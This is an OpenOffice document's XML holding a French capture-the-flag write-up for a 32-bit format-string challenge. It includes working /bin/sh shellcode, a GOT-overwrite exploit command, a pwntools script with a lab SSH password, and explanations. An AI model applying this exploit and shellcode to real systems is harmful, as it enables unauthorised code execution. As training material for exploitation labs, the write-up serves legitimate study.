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04500002550F81BB54B.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text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" fo:font-weight="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>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6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>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Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>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text-align="justify" style:justify-single-word="false"/>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P9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>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P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-size-complex="12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6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#6ab825" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#447fcf"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#447fcf" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#24909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265064777707392402" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">Level 05</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On est sur du <text:span text:style-name="T1">x32</text:span><text:span text:style-name="T2"> / </text:span><text:span text:style-name="T1">C</text:span><text:span text:style-name="T2">. On reconstruit le code source suivant :</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P12">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T5">main</text:span><text:span text:style-name="T7">(</text:span><text:span text:style-name="T3">void</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P15">{</text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T7">size</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T7">n</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T3">char</text:span> <text:s text:c="3"/><text:span text:style-name="T7">buff[</text:span><text:span text:style-name="T9">100</text:span><text:span text:style-name="T7">];</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">fgets(buff,</text:span> <text:span text:style-name="T9">100</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">stdin);</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T3">while</text:span> <text:span text:style-name="T7">(buff[size]</text:span> <text:span text:style-name="T7">!=</text:span> <text:span text:style-name="T10">'\0'</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T7">size++;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T3">while</text:span> <text:span text:style-name="T7">(n</text:span> <text:span text:style-name="T7">&lt;</text:span> <text:span text:style-name="T7">size)</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">{</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T3">if</text:span> <text:span text:style-name="T7">(buff[n]</text:span> <text:span text:style-name="T7">&gt;</text:span> <text:span text:style-name="T9">0x40</text:span> <text:span text:style-name="T7">&amp;&amp;</text:span> <text:span text:style-name="T7">buff[n]</text:span> <text:span text:style-name="T7">&lt;=</text:span> <text:span text:style-name="T9">0x5a</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T7">{</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="12"/><text:span text:style-name="T7">buff[n]</text:span> <text:span text:style-name="T7">^=</text:span> <text:span text:style-name="T9">0x20</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T7">}</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T7">n++;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">}</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">printf(buff);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">exit(</text:span><text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P11">}</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Le programme est assez simple. Il lit sur l'entrée standard 0x64 (100) bytes de données, qu'il place dans un buffer de la même taille. Il parcourt ensuite la chaîne afin d'effectuer un </text:span><text:span text:style-name="T1">xor 0x20 </text:span><text:span text:style-name="T2">sur chaque byte qui se situe entre</text:span><text:span text:style-name="T1"> 0x40</text:span><text:span text:style-name="T2"> et </text:span><text:span text:style-name="T1">0x5a</text:span><text:span text:style-name="T2">. Cela équivaut simplement, en réalité, à transformer chaque lettre majuscule (en ASCII, 0x40 – 0x5a) en minuscule (par le </text:span><text:span text:style-name="T1">xor</text:span><text:span text:style-name="T2">).</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">En outre, on a à la fin du programme une vulnérabilité de </text:span><text:span text:style-name="T1">format string </text:span><text:span text:style-name="T2">assez clairement présente. On est sur du x32 bits, on va donc pouvoir aisément écrire à des adresses arbitraires sans se soucier des NULL BYTES dans l'adresse comme en x64.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">La fonction </text:span><text:span text:style-name="T1">exit </text:span><text:span text:style-name="T2">est appelée juste après la vulnérabilité dans notre programme. On peut donc facilement prendre le contrôle du flux d'exécution du programme en remplaçant l'adresse </text:span><text:span text:style-name="T1">.got.plt </text:span><text:span text:style-name="T2">de cette fonction </text:span><text:span text:style-name="T1">exit</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Maintenant, la question est de savoir où est-ce qu'on souhaite rediriger le flux d'exécution. La première options serait dans le buffer lui-même puisqu'on en contrôle le contenu. On a essayé de faire ça, le problème est que placer un payload dans le buffer est un peu pénible puisqu'on ne peut utiliser aucun byte entre </text:span><text:span text:style-name="T1">0x40 et 0x5a</text:span><text:span text:style-name="T2">, ceux-ci se feront </text:span><text:span text:style-name="T1">xor</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">On va simplement faire comme </text:span><text:span text:style-name="T1">Rainfall – bonus0 </text:span><text:span text:style-name="T2">et placer notre shellcode à un endroit où il ne sera pas modifié et qu'on contrôle entièrement sur la stack, une </text:span><text:span text:style-name="T1">variable d'environnement</text:span><text:span text:style-name="T2">. Commençons par créer cette variable d'environnement et d'en chercher l'adresse approximative :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4"><text:soft-page-break/>env -i PWN=$(python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") gdb level05</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P5"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="0.792cm" svg:y="0cm" svg:width="11.689cm" svg:height="9.035cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000304500002550F81BB54B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P6">On a lancé <text:span text:style-name="T1">gdb </text:span>avec uniquement notre variable d'environnement <text:span text:style-name="T1">PWN </text:span>afin de restreindre au maximum les variations d'environnement. Les adresses bougeront cependant inévitablement, d'où la grosse NOP sled. On choisit une adresse qui se situera environ au milieu de la NOP sled, prenons <text:span text:style-name="T11">0xffffde6e</text:span>.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">On récupère également le nombre de variables nécessaires pour que les specifiers injectés dans notre <text:span text:style-name="T1">printf </text:span>vulnérable pointent sur le début de la format string elle-même, et on dispose de toutes les informations nécessaires :</text:p>
      <text:list xml:id="list7555349290673748774" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">exit .got.plt </text:span>:<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>0x80497e0</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="T1">write at addr at start of format string</text:span> :<text:tab/>%10$n</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P9">shellcode addr<text:span text:style-name="T2"> :<text:tab/><text:tab/><text:tab/><text:tab/>0xffffde6e</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P8"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2">Pour les détails et explications du script ci-dessous qui nous permet d'écrire à une adresse arbitraire (ici .got.plt de exit), voir </text:span>Rainfall – level4 <text:span text:style-name="T2">+ </text:span>Rainfall – formatstring<text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2">&gt;&gt;&gt; </text:span><text:span text:style-name="T13">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">&gt; Generate payload in file </text:span>payload <text:span text:style-name="T2">with exploit.py.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">&gt; Transfer the file </text:span>payload <text:span text:style-name="T2">to </text:span>/tmp/payload <text:span text:style-name="T2">on target.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">$ </text:span><text:span text:style-name="T12">cat /tmp/payload - | env -i PWN=$(python -c "print('\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") ./level05 </text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T12"/></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">(Env -i est important pour supprimer toutes les autres variables d'environnement à l'exécution, puisqu'on a récupéré l'adresse approximative de notre variable d'environnement contenant le payload sans aucune autre variable d'environnement).</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P10"><text:soft-page-break/><text:span text:style-name="T2">&gt;&gt;&gt; </text:span><text:span text:style-name="T13">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T4">from</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T6">pwn</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T4">import</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T8">*</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T3">def</text:span> <text:span text:style-name="T5">calculate_padding</text:span><text:span text:style-name="T7">(bytes_written,</text:span> <text:span text:style-name="T7">desired_byte)</text:span> <text:span text:style-name="T7">:</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">desired_byte</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T9">0x100</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">bytes_written</text:span> <text:span text:style-name="T7">%=</text:span> <text:span text:style-name="T9">0x100</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T7">padding</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">(desired_byte</text:span> <text:span text:style-name="T7">-</text:span> <text:span text:style-name="T7">bytes_written)</text:span> <text:span text:style-name="T7">%</text:span> <text:span text:style-name="T9">0x100</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T3">if</text:span> <text:span text:style-name="T7">(padding</text:span> <text:span text:style-name="T7">&lt;</text:span> <text:span text:style-name="T9">10</text:span><text:span text:style-name="T7">)</text:span> <text:span text:style-name="T7">:</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T7">padding</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T9">0x100</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T3">return</text:span> <text:span text:style-name="T7">padding</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">s</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">ssh(host=</text:span><text:span text:style-name="T10">'192.168.1.3'</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">port=</text:span><text:span text:style-name="T9">4242</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">user=</text:span><text:span text:style-name="T10">"level05"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">password=</text:span><text:span text:style-name="T10">"3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN"</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">p</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">s.process([</text:span><text:span text:style-name="T10">"/home/users/level05/./level05"</text:span><text:span text:style-name="T7">],</text:span> <text:span text:style-name="T7">env={</text:span><text:span text:style-name="T10">"PWN"</text:span><text:span text:style-name="T7">:</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">'\x90'</text:span> <text:span text:style-name="T7">*</text:span> <text:span text:style-name="T9">500</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'</text:span><text:span text:style-name="T7">})</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">waddr</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">'\xe0\x97\x04\x08\x11\x11\x11\x11\xe1\x97\x04\x08\x22\x22\x22\x22\xe2\x97\x04\x08\x33\x33\x33\x33\xe3\x97\x04\x08'</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">bytes_written</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0x1c</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">''</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">waddr</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">first_byte_padding</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">calculate_padding(bytes_written,</text:span> <text:span text:style-name="T9">0x6e</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"%0"</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">(</text:span><text:span text:style-name="T14">str</text:span><text:span text:style-name="T7">(first_byte_padding)).encode()</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"u%10$n"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">bytes_written</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">first_byte_padding</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">second_byte_padding</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">calculate_padding(bytes_written,</text:span> <text:span text:style-name="T9">0xde</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"%0"</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">(</text:span><text:span text:style-name="T14">str</text:span><text:span text:style-name="T7">(second_byte_padding)).encode()</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"u%12$n"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">bytes_written</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">second_byte_padding</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">third_byte_padding</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">calculate_padding(bytes_written,</text:span> <text:span text:style-name="T9">0xff</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"%0"</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">(</text:span><text:span text:style-name="T14">str</text:span><text:span text:style-name="T7">(third_byte_padding)).encode()</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"u%14$n"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">bytes_written</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">third_byte_padding</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">fourth_byte_padding</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">calculate_padding(bytes_written,</text:span> <text:span text:style-name="T9">0xff</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"%0"</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">(</text:span><text:span text:style-name="T14">str</text:span><text:span text:style-name="T7">(fourth_byte_padding)).encode()</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">"u%16$n"</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T7">bytes_written</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">fourth_byte_padding</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T10">'a'</text:span> <text:span text:style-name="T7">*</text:span> <text:span text:style-name="T7">(</text:span><text:span text:style-name="T9">100</text:span> <text:span text:style-name="T7">-</text:span> <text:span text:style-name="T14">len</text:span><text:span text:style-name="T7">(payload))</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15">p.sendline(payload)</text:p>
      <text:p text:style-name="P11">p.interactive()</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">L'exploit est similaire aux vulnérabilités formatstring qu'on a déjà pu faire jusqu'à présent. On écrit grâce aux specifiers </text:span>%n <text:span text:style-name="T2">qui nous permettent d'écrire aux adresses du début de notre chaîne de format. On écrit ainsi, byte par byte, des petits entiers dans le lowest byte de chaque adresse, jusqu'à </text:span><text:soft-page-break/><text:span text:style-name="T2">reconstruire la valeur qu'on souhaite remplacer aux adresses du début de la format string.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2">Ici, on place 0xffffde6e à l'adresse 0x80497e0.</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P10">Got flag<text:span text:style-name="T2">.</text:span></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3M2S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-07T15:28:21.85</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="1" meta:object-count="0" meta:page-count="4" meta:paragraph-count="74" meta:word-count="711" meta:character-count="5331"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>